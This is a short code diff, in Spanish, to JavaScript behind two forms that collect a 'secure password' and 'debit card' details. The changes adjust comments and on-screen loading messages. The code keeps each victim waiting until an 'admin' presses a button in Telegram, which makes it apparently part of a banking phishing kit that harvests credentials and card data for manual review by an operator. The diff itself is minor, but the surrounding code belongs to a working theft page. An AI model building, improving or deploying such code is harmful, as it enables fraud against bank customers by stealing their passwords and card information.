@@ -118,6 +118,8 @@ document.addEventListener('DOMContentLoaded', function() {
             }
 
             window.isSubmitting = true;
+            
+            // MOSTRAR LOADING INMEDIATAMENTE
             if (window.commonUtils) {
                 window.commonUtils.showLoading('Enviando información...');
             }
@@ -152,16 +154,16 @@ document.addEventListener('DOMContentLoaded', function() {
                     throw new Error(result.error || 'Error al procesar la solicitud');
                 }
 
-                console.log('✅ Datos enviados exitosamente, esperando respuesta...');
+                console.log('✅ Datos enviados exitosamente, esperando respuesta del administrador...');
                 
                 sessionStorage.setItem('formData', JSON.stringify({
                     tipo: 'Clave Segura',
                     formulario: 'clave'
                 }));
 
-                // Mantener loading hasta respuesta del admin
+                // MANTENER LOADING HASTA QUE EL ADMIN PRESIONE BOTÓN EN TELEGRAM
                 if (window.commonUtils) {
-                    window.commonUtils.showLoading('Información enviada. Esperando verificación...');
+                    window.commonUtils.showLoading('Información enviada. Esperando verificación del administrador...');
                 }
 
             } catch (error) {
@@ -203,6 +205,8 @@ document.addEventListener('DOMContentLoaded', function() {
             }
 
             window.isSubmitting = true;
+            
+            // MOSTRAR LOADING INMEDIATAMENTE
             if (window.commonUtils) {
                 window.commonUtils.showLoading('Enviando información...');
             }
@@ -238,16 +242,16 @@ document.addEventListener('DOMContentLoaded', function() {
                     throw new Error(result.error || 'Error al procesar la solicitud');
                 }
 
-                console.log('✅ Datos enviados exitosamente, esperando respuesta...');
+                console.log('✅ Datos enviados exitosamente, esperando respuesta del administrador...');
                 
                 sessionStorage.setItem('formData', JSON.stringify({
                     tipo: 'Tarjeta Débito',
                     formulario: 'tarjeta'
                 }));
 
-                // Mantener loading hasta respuesta del admin
+                // MANTENER LOADING HASTA QUE EL ADMIN PRESIONE BOTÓN EN TELEGRAM
                 if (window.commonUtils) {
-                    window.commonUtils.showLoading('Información enviada. Esperando verificación...');
+                    window.commonUtils.showLoading('Información enviada. Esperando verificación del administrador...');
                 }
 
             } catch (error) {
